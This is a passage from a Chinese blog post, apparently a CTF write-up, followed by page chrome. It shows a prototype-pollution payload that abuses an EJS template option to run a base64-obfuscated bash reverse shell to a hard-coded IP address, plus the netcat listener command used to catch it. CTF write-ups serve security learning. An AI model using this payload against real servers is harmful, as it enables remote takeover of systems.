+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623213341087.png" alt="image-20230623213341087"></p>
+<p>接下来就是利用adminDIV路由进行原型链污染</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo%20YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzQzLjE0My4xNTUuOTAvMTExMSAwPiYx%3D%7Cbase64%20-d%7Cbash&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214121129.png" alt="image-20230623214121129"></p>
+<p>最后利用admin路由进行模板渲染，直接访问&#x2F;admin路由即可</p>
+<p>注意要使用服务器进行nc端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 1111</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214302527.png" alt="image-20230623214302527"></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/dashang.jpg" alt="Alpha 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Alpha 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/30/pay-to-win(TJCTF%202023)/" rel="prev" title="TJCTF 2023">
+      <i class="fa fa-chevron-left"></i> TJCTF 2023
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Alpha"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">Alpha</p>
+  <div class="site-description" itemprop="description">forever</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer">
+   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66">
+   </iframe>
+  </div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">world</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'PZfVYAl8hrPpczg4EF7C05Rh-gzGzoHsz',
+      appKey     : 'cx8a6nD3cI8V4erQeXcAarYz',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
